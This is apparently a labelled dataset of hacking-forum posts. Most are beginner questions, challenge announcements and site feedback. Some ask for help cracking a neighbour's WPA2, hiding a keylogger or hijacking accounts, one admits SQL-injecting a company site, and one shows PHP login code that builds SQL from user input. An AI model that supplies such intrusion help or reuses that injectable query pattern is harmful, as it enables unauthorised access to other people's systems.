label	title	content
1	Java: MATH.random exploit	im new to java and object oriented programming in general, so i may have bitten off a bit more than i can chew with my current project. i was wondering what you all knew about the math.random method. im assuming it uses a seed, but i cant find the approximate length of the seeds, or any other details that might be vaguely helpful really. basically, the program im working on simulates a dice roll using math.random, but id like to hack my program and see if im able to predict the outcome of the dice roll before it happens. ultimately, im wondering what security flaws are presented specifically by using math.random to generate my rolls. if you have any insights or can direct me to any information that might be useful, id really appreciate the help.
1	dealing with the uni network	hey guys,   first of all i want to apologize if i am posting in a wrong section. i couldnt find anything specifically related to anonymity. so recently i moved in to the university. there is one problem that i am having though. the network has very restrictive rules - i am not 100% sure, but based on what i tried, the firewall blocks almost all the traffic except internet (port 80) - so no ftp, rdp, vpn, proxies. of course many of the websites are blocked too, as well as torrenting (obviously). what i am trying to do is bypass this sh*t and maintain my privacy (as much as possible).   there are several ways i could go about this - vpn, ssh tunnel or tor is what i was thinking. from these three i tried vpn which is blocked apparently. i am not sure if id be able to configure tor to route all my traffic (not only internet browsing) through its nodes. i think ssh tunnel would be optimal, as long as i could configure it through port 443 (which should be open in the uni firewall).  i would need to connect to a vps (or any remote machine) - windows, for convenience. but i am not sure about this whole procedure. ive never actually configured a ssh tunnel.    could you give me any suggestion/tips? what would you do in this case? thanks
1	wanna learn can u help	i was trying to see what you need to learn to be a good hacker can anyone point me to any books or videos that can tell me anything i need and if their r any mentors out their that can guide me than  thanks.
1	Avoiding schools proxy? Please Help.	at school, they have a proxy login for each user, a username and a password. i have been trying to find ways around this problem, but i cant. i have heard that you can set up a private network, or something, and access all sites that way, including torrenting. i have tried to set a proxy by following several tutorials, etc. and this is all i have come up with:  http://private-web-proxy.appspot.com/ . i really dont know anything about what i am doing. ive heard someone at school has set up a vpn and is able to do anything, i obviously have no idea how to do it, but he wont tell anyone how to do it. please pm.
3	The Art of Exploiting SQL Injection: 1 day hands on training	"hello all, this year at black hat las vegas, i will be hosting a 1 day training course on the most popular web app hacking technique sql injection. video preview:  http://www.youtube.com/watch?v=6pg-lrv8xtq here is the abstract of the course: ""this is a full day hands on training course which will typically target penetration testers, security auditors/administrators and web developers to learn advanced exploitation techniques. sql injection, although now nearly 15 years old, still exists in over 30% of the web applications. this vulnerability could typically result in 3 scenarios: authentication bypass extraction of arbitrary sensitive data from the database access and compromise of the internal network. this training will target 3 databases: ms-sql mysql oracle and discuss a variety of exploitation techniques to exploit each scenario. the aim of the training course is to address the following: understand the problem of sql injection learn a variety of advanced exploitation techniques which hackers use learn how to fix the problem identify, extract, escalate, execute; we have got it all covered. more details can be found here: https://www.blackhat.com/html/bh-us-12/training/courses/bh-us-12-training_exploiting-sql-injection.html there are a few seats still left and the course will sell-out very soon. if you require more details feel free to contact me at sid-at-notsosecure-dot-com thanks sid"
1	unsure...	"i am unsure of where this particular question should go or should have went, anyway...i just signed back up under this user account and it has been a while since i got to use the internet or had a computer for that matter..i actually tried to access my old account ""hedonist"" but i have forgotten all of my old accounts and passwords etc..i am trying to retrieve the name and am unsure of how to go about getting the account back. i know for a fact that the account has been idle since before this latest version update approx 2-3 yrs, and can try to provide any info that may be required to verify that i am who i say i am. basically any assistance with this particular issue would be appreciated...and on a side note i am glad to see that at least some of the places i went to online havent changed."
1	wpa-psk 2	hey there i was wondering im trying to hack my mates internet. who lives up stairs and i was wondering if anyone could help me with hacking it? i know its a wpa-psk 2 security key and that i can bet money on it its still the default one off the telecom modem..  anyone help a complete noob to hacking?
3	Laptop or desktop...	"this problem has bothered me for while now but first of all little background which has lead to this: i have a few years old laptop, 15""/3gb ram/dual core 2.16ghz/basic videocard, which is still runing quite smoothly windows 7 except when im using external monitor: the image is not clear with hd resolution so i have to use 1440x900 which is kind of annoying cos i bough a new monitor resently when i noticed that one monitor is not enought and i would love to use its full potential. secondly i cant use both my monitors and the video output is vga. then my old desktop is reach its end (64bit amd 3500+/2gb ram/ati radeon 850 pro [but i already found a buyer for it]).  so i have two 24"" monitors + i dont play games by my computers but the new computer has to have enough power to light weight photo manipulation, (to run virtual linux system if it will be my only computer) and have multiple tasks as runing at same time... (default situation is that i have eclipse, couple browsers, spotify, chats, few explorers, older photoshop and few other windows open at the same time) okey, then. the problem is that now i have to buy a new computer and i have been bouncing betweed a new laptop or a desktop. so the guestion is in two parts. if i buy a new laptop how can i get both monitors in use? does it need some docking station that has dual dvi port and if so which manufacture you guys suggest/recommend? i did a little browsing and found out that only few ones has docking station support... the second part is that i have been thinking if i also sell my current laptop and only have this one laptop with docking stations... i know its bit risky choice but does anyone has experience from that type of situation? is it enought...? normally i run my computer 24/7 and reboot it once in month   still, these decisions are hard   one choise defines my next 3-4 years...  the desktop has its benefits: great upgrading abilities, cheaper... also the laptop has its own: compact, all-in-one, easy to take it with you... when i have two computers its always balancing betweed them... another has always it what you will need into the other....  like you can see... i cant make these type of decisions: please help me clear my mind..."
3	ACTA	"acta is an abbreviation for the  anti-counterfeiting trade agreement. it is an international treaty that will be pushed to implementation by 2010. it has been discussed in secret since october 2007, and has been leaked by government officials who were against the unconstitutional, ineffective, inhumane, and unlawful nature of such a treaty. countries affected by this treaty include but are not limited to: australia, canada, the european union, japan, the republic of korea, mexico, morocco, new zealand, singapore, switzerland and the united states the official goal of the agreement is the international enforcement of strong intellectual property rights. acta is a treaty, which would overcome many court precedents in your own country that defines consumer rights as to ""fair use"" and would remove any limitations on the application of intellectual property laws. this means that acta would  overrule any laws in your own country, and deal harsher, unfair and ineffective punishment to anyone suspected of piracy, without a trial in court. acta also makes internet service providers legally responsible for any of its users downloaded content. acta gives recording industries more rights to enforce copyrights and officers of the law the right to search any digital device for copyrighted material. did you pay for the songs on your ipod? under the new law, that instantly classifies you as a criminal, and the same classification as murderers and rapists. you will get a criminal record. even if you do not download songs onto your ipod, you will feel the effects as millions, possibly billions of dollars in taxpayers money will be poured in to catch these ""criminals"", money that can be used to save lives. part of acta deems anyone accused of copyright infringement to ""compensate"" for the loss in profit to recording companies. they want harsher punishments for these criminals. these recording companies, such as umg, earn upwards of $1 billion in 2009. however, the riaa (recording industries association of america) recently sued a 12 year old girl for downloading, as well as many other people. they are seeking $150 000 per song, on allofmp3.com. how much harsher will they go? join the irc channel: irc.n0v4.com #antiactaplanning web client internet freedom movement forums more reasons acta is dangerous wikileaks on acta leaked agreement wikipedia"
2	dislosing a vunerability	"about a week ago, i rang up a company because their web site had obviously been hacked. i went back yesterday and they had fixed it up. i noticed a few things like directory listing of obviously content that should not be publicly available and then i stumbled upon a hidden ""admin logon page"". having just completed realistic 2 and having a user name i could not resist in trying the sql injection hack. im in and it presented me with lots of nice tools to add and remove content to their site    . i cant anonymously call this time because the technical detail is too high for the receptionist. is the best bet to send them snail mail or should i just move on and forget about it? it is not an ecommerce site, but they would have enermies who would like to deface their website. it is not a political website - they just do necessary things that the public generally dont like."
1	Facebook hacking	hello guys im new but im a good: i want to learn to hack anything, but i just use good . i like so i just wanted to because i can help others to be able to hack the account they would teach me because i just want to get my account was that hack friends ivel that he hacked my account before but he no held
3	Green as grass.	hey guys, so i’m about as green as green gets with this world. (html, java, networking, etc.) so take er’ easy on me.                   i guess a little history as to why i am here now would be appropriate so; i’m 19 now (yes i’m arriving to this party a little late) but i’ve always been fascinated with computers and most things to do with them. so it’s no surprise (at least to me) that i’m here today. but as its apparent i am looking to get into learning coding, networking, hacking and what-have you. i’ve made extremely simple drafts of web pages with html before, although long enough ago that i have no sense of what’s up from down. in the last week or so i’ve been meandering around the internet with a real conviction to learn the ups and down with hacking. and before we go any farther, i am interested in both sides of hacking, whether it be white-hat or black. it interests me. black-hat hacking interests me in not the maliciousness but the methods and processes some people come up with to overcome crazy security and “stick it to the man”. so don’t worry, you’re not going to see me as the next face getting arrested for attacking some credit card company. (i’m to paranoid for that kind of thing lmao)                   as it has been posted numerous times before me, “where tha hell do i start?” don’t get me wrong, i have a lot of the threads here to see if i could answer my own questions. but i still feel i have many more, and probably will continue to have questions for a long damn time.   i’ve dabbled through the html guides online and i still have a lot more to learn. i guess ill just jot down a list of what i’m interested in and whoever can help me out it would be greatly appreciated!   -          what languages do i need to learn to get started? (html, java, etc) -          am i better off sticking with windows, since i’ve used it forever. or should i dive into linux? or even a mac (i used to have one) -          networking, lots of networking. (if that makes sense)   this is more going to be a hobby of mine, so i’m in no rush to learn everything asap. although i’d love to quickly become a ninja with computers. and if i actually become proficient with this stuff i’d like to work in a field of work that is compatible with this knowledge… one step at a time.   i’m also not shy of dishing out some money for this new hobby of mine, so i’m asking what kind of computer would be sufficient for this kinda thing (i don’t want to be replacing it anytime soon) my price limit is 2000$ and i’m partial to a laptop. should i be looking into linux for a new system?   and i like privacy, i downloaded tor and its pretty cool. “google deutschland” makes me chuckle every time. so any other programs like that are pretty interesting to me.     *after reading all this, my thoughts are kinda jumbled up, so if theres anything that doesn’t make any sense ask me and ill get it cleared up!   cheers,
3	CSRF blocked	well, i was doing the ext. basic missions and decided to move on from the one i was doing as i couldnt figure it out afer a while and when i did firefox said it couldnt load page as it had expired and then i clicked reload. it took me to the mission i had just completed, and below the mission code for ext basic 3 it said csrf blocked. now i read up on it and its cross site request forgery, did someone try doing something to me or is it just because i reloaded the page because i expired? sorry. i decided to repeat what i did and its because i reloaded the page.
3	Some feedback on site usability...	i used to be active on hts many years ago. i actually learned a lot about computers/programming since then, and decided to come back to dick around with the challenges. anyway, seems like things are a bit dead around here. the irc channels even used to be extremely active. i know this isnt solicited advice, but just some thoughts: 1) the text is hard to read. i have 20/20 vision and doing some of these challenges, between the stark contrast of black/white/grey and small text size, i had to copy and paste to a notepad document to read some of it a great example:  https://www.hackthissite.org/missions/r ... index.html 2) navigating missions is awfully hard. when i complete a mission i then end up back at a page where i have to scroll through to find the next mission. i know it used to be like this, but there seem to be a bit more missions now. 3) registration - a 15 character password required? i know thats good password length, but lets be honest, i have a hard enough time remembering all of my passwords let alone an extra 15 characters one. 4) login: forgot my username i regsitered with, and entered the wrong one before i got it right. after one failed login a captcha was required. this seems a bit excessive.... i hope you dont dismiss my post as non-sense but, im trying to help
1	"What comes after ""Getting started""?"	"my understanding of hacking is that its a way of interacting with a system(network, web, etc) in ways the maker of the system did not intend. like bypassing the interface they want you to use, and using your knowledge of such systems to get more functionality out of it than they want. id like to advance my knowledge further but i dont know what to look into specifically. im already conversant with scripting languages (html, javascript, php, etc). for instance, i have burp. i know how to spider and then scan a website(carefully) or even just passively scanning it by manually going through the web application. itll come up with a list of vulnerabilities. i know what they mean and if i dont it explains it. however, i dont know what to do with them. this sites missions are helpful, because to complete a mission you have to exploit different vulnerabilities and when i figure out how to complete it i always study up on the details of how and why. so, ive learned about injections, xss, cookies, hash values, etc. however, it seems to me like these things are only a couple drops in a very large bucket. that most web applications except amateur ones would be protected against them. so, what im asking is this. if i know the programming well enough, and my end goal was pentesting or trying to gain admin access to a website(or something along those lines) where should i direct my focus. injections, xss, etc are the tools i have now, what other ""tools""(techniques?) are there?"
1	Is is possbile to hack this admin page ?	"hello,  ive created this login admin page. can you help me to tell if can be hacked and how ? it is vulnerable to sql injection ? code:  select all <?php include_once(../_config/_config.php); include_once(../_library/_library.php); load_helpers(array(_mysql,_validation,_mailer,_template),../); $template   =new template(_template); $validation =new validation; $mail       =new phpmailer(); $database   =new mysql(true, .database., .host., .username., .password.); if ($database->error()) $database->kill(); $er_login=; $no_login=; $er_recover=; $no_recover=; $ok=; $show=; if(isset($_post[login])) { $source= array(             username => @$_post[username],             parola   => @$_post[password]               );            $rules = array(             username=>array(type=>string, required=>true, min=>1, max=>50, trim=>true),             parola  =>array(type=>string, required=>true, min=>1, max=>50, trim=>true)             );           $validation->addsource($source); $validation->addrules($rules); $validation->run(); if(sizeof($validation->errors) > 0)  { $er_login=$validation->errors; } else { $database->query(""select `username`, `level` from admin where `username`="".$validation->sanitized[username]."" and `password`="".md5($validation->sanitized[parola])."" and active=1 limit 1""); if($database->rowcount()==1) {  $admin=$database->rowarray(0, mysql_assoc); $_session[admin]=$admin[username]; $_session[level]=$admin[level]; header(location: .site./admin/home/); exit(); } else {  $no_login=datele de logare in partea de administrare sunt incorecte!;  } } } if(isset($_post[recover])) { $source= array(             username => @$_post[username],             email    => @$_post[email]               );            $rules = array(             username=>array(type=>string, required=>true, min=>1, max=>50, trim=>true),             email   =>array(type=>string, required=>true, min=>1, max=>50, trim=>true)             );           $validation->addsource($source); $validation->addrules($rules); $validation->run(); if(sizeof($validation->errors) > 0)  { $er_recover=$validation->errors; } else { $database->query(""select `username`, `email`, `id` from admin where `username`="".$validation->sanitized[username]."" and `email`="".$validation->sanitized[email]."" and active=1 limit 1""); if($database->rowcount()==1) {  $data=$database->rowarray(0, mysql_assoc); $password=random_string(alnum,8); $database->query(""update admin set `password`="".md5($password)."" where id="".$data[id]."" limit 1"");"
3	Am I cheating myself?	hey i have managed 4 of the programming missions on here, my problem is that on some of the challenges (most notably number 2) i didnt write a single program to solve the challenge. what i did was make some smaller programs that were linked together with a bash script. to illustrate: grab image in chrome <bash script starts here> imagemagick to convert to raw small java program to output a text file containing hex values of each pixel sed to clean up the text file pass text file to another small java program to get password. now, my problem, is this still in the spirit of the challenges or is this showing holes in my programming ability? sure i could do some google-fu for a few hours and find out how to do it in a single java file but the way i did it is what instantly came to me when thinking it through on paper. thoughts?
1	help me learning somthing	hy hacker there is a site called  url removed  and they hacked a site of my friend and i wanna know how i can get there usernames or password dont do it for me but tell me how to get it and do it you can visit the site  url removed and its able to hack because someone did it this week                      sorry for bad english
1	Keylogger anyone?	im new to this site, and i heard about it from a close friend of mine. i was wondering if anyone had any ideas on how i could get my hands on a decent keylogger that i dont have to pay for? ive heard of shadow keylogger, but im not sure on how to download it, im a noob at searching and retrieving things like this lol. i need a keylogger that cannot be found via spyware and is well hidden. any help would be greatly appreciated. alice
1	I Lost My Windows 7 password	"hi guys, do you agree that  time could dilute the memory, but you cant make people forget his memory? get to the point, i had ever  lost windows 7 password and that matter confused me for a long time. it is a very terrible experience, which influenced my work and life for two weeks. i lost my head and almost smashed my acer aspire computer during that period. for many times i asked myself, why did i    *link removed*  lost my password for windows 7[/url] ? why did i make my life in a less?  it doesnt make any diffference! god works! my parents comforted me like that words more than once. however i didnt out of my dilemma and blamed myself again and again, it is my fault! it must be my fault! why did i lost my password for windows 7? why did i be so stupid to lost windows 7 password? during that time i had no direction, i just got wherever the wind blows. i was concerned about the project martirals of my company. the project was around the conner and the most terrible situation was that all the materials i prepared was in the computer and i   lost my windows 7 password   so that i couldnt login into my acer aspire laptop!  i couldnt help crying aloud for thirty minutes in the small hours of one mornning. at the same time my parents came to me and told me that i distubed my family and neighbour just now. ""calm down, poor guy! you only lost windows 7 password. it is not the end of the world! come on and find out the solution. we are always by your side. lets do it together! "" my father said, with his encouraging eyes. ""thank you, dad."" i replied. the next day we borrowed a workable computer from our neighbood and began to search on the internet about  lost acer windows 7 password  for the whole day. at last , we got the answer from an article of windows password recovery tool website. that is great! thank god!"
3	Lectures are Live!	"friday, september 17, 2010 @ 8 pm central time: hts irc room =  #lecture ventrilo server =  vent.i-cog.org : 9765 come join us for the first official hts lecture in over  1,000,000 milliseconds ! thats right.  this friday, yours truly will be hosting the first of (hopefully) many (successful?) lectures (/rants). the lecture topic for this week will be meet the staff.  ha!  i bet you thought you were getting an  actual  lecture.  disregard that. we will be ""meeting the staff"" at the beginning of the lecture, but we will also be going into ""basic hacking"" - some general pointers, skills youre going to need, a schpeel on the missions (and what youll need for each), etc. this first lecture will be less formal and ""focused"", but you will definitely be doing some learning. --sanddbox  i laugh at your naïvté! but fer srs, we didnt want to plan this great lesson for the first lecture, then have only 2 people show up.  we want to have this first one be more low-key and relaxed, something fun that everyone can enjoy.  well begin this lecture with a lecture on lectures; basically just a run-down of how things will work, what to expect, etc. so, we expect anyone worth their weight in piss to be there.  if you dont have vent,  get it .  you dont need a mic, just listen.  were still working out the exact details, so this run will help determine how future lectures will go.  that said, bring your suggestions (the good ones) and dont be afraid to ask questions.  after all, thats why were here. add:  if you happen to live in the uk or some other weird country that doesnt user merkin time, we will be recording both the irc logs and vent audio.  they will be publicly available for viewing or download on the main site. see you there! -- goatboy --"
3	I cant enter basic mission	i registered to this site 3 hours ago, and, i have been trying to enter mission 1 since the last 2. i keep getting that my password is invalidm wich it isnt. i even tried logging out and in, and the password was just fine. what can be the problem?
3	Limdis Doxing Mission --CHALLENGE DOWN--	ok so the last portion of the challenge has been destroyed due to a particular website being taken down. that means the mission is down until further notice... sucks i know. but im going to have to create new content and change links in order to get this back up. -------------------------------------------------------------------------------------------------------------------------------------------- from: anonymous hts staff, i am a freelance private investigator and i represent a client who was recently a victim of identity theft. being that i specialize in physical investigations i would like to ask if you could assist me in tracking this individual down from the digital side. hts has a reputation for taking great care in keeping things quiet and entirely anonymous. my client wishes to handle this situation in their own way so this will not come back to the site. my research on this matter has led me to believe that the hacker may be a member here, though according to his profile he has not been active in some time. i would like to ask if you could pass this username to some of your trusted and skilled members to see if anything comes up that might assist me in tracking this individual down. thank you in advance for your support. alright hts let’s help this guy out. you know the drill; usernames, emails, hometown, real name, birthday, phone number, pictures, and any other juicy information. target: 1amtinytim verify if this individual is involved in anyway. follow any lead. but stay quiet. we are not to get directly involved. do not contact this person! we are to only collect data and pass it off the pi. remember, id thieves can be tricky. don’t believe what you first see. he has likely planted false information to protect himself. finally, see if the stolen information can be recovered. good luck! -------------------------------------------------------------------------------------------------------------------------------------------- this mission is designed to teach some basic doxing techniques and to show just how easy (and some cases quickly) someone can collect information on you. once you know what can be found, you will learn how to keep that information private. to which i encourage everyone to dox themselves after completing the mission to see just what kind of fingerprint you have. you will not need to se for this mission.  you will get to hack into one location, and it will be obvious what that will be once you get there.  please do not hack into any of the accounts found; as it is not needed for this mission and will lead to a dead end anyway. additionally, if i lose control i won’t be able to make updates/fixes. don’t ruin it for everyone else. finally, if you made a mistake in your search the account you are hacking might not belong to me. also, because i cannot control what other websites do if at any time an issue arises that may prevent completion, pm me and i will make fixes. i will be sure to inform everyone if any significant updates happen.  do not download anything! as i have not set up the mission to require any direct downloads. upon completion of the mission you will find a personal congratulatory message from me and be able to list your hts nick for credit. this will also be the discussion thread for the time being. please don’t post spoilers but feel free to ask questions and assist others. enjoy. i have left a lot of room to expand this challenge to integrate more advanced techniques in the future and i would absolutely love to do so if you guys/gals like it and want it to continue. required: - google - email address - extreme attention to detail (take notes). go slow. - treat this like a real life scenario. protect yourself. you may need to create dummy accounts. no idea what doxing is? see here: https://www.hackthissite.org/articles/read/1107/ users completed: centip3de shade_of_gray tomvercetti813 mshred fashizzlepop debus7 darkdexter last update: 11/09/2012 - fixed spam filter preventing completion (again), adjustments to mission text, altered chat log, various small items throughout mission
1	Password finder/cracker	im trying to use ftp to enter my website , i know the user name but the problem is how to get the password to login to the site as the admin because i have forgotten the password i used.....?? im a newbie here and i would appreciate any help....is there any software needed ?? i have tried password recovery but its not working.
1	Car Hacking	"car hacking - potentially one of the biggest cyber security threats in the near future? since the beginning of the 21st century, computerization has dominated humanity in almost every aspect of life. everything from mobile phones to cars and homes have become computerized for ""convenience"". not only are these elements computerized, they are also connected through cellular networking... which is what poses the risk. any computerized device can be hacked through what ever network it is connected to and be used in a dangerous manner. anyone who is connected to your car (or house, if computerized) can listen to you, track and even hijack the controls causing an accident (with a house, the hacker could fill the water heater up with some type of gas... i dont need to explain the rest). t his thread is dedicated to the discussion of car hacking."
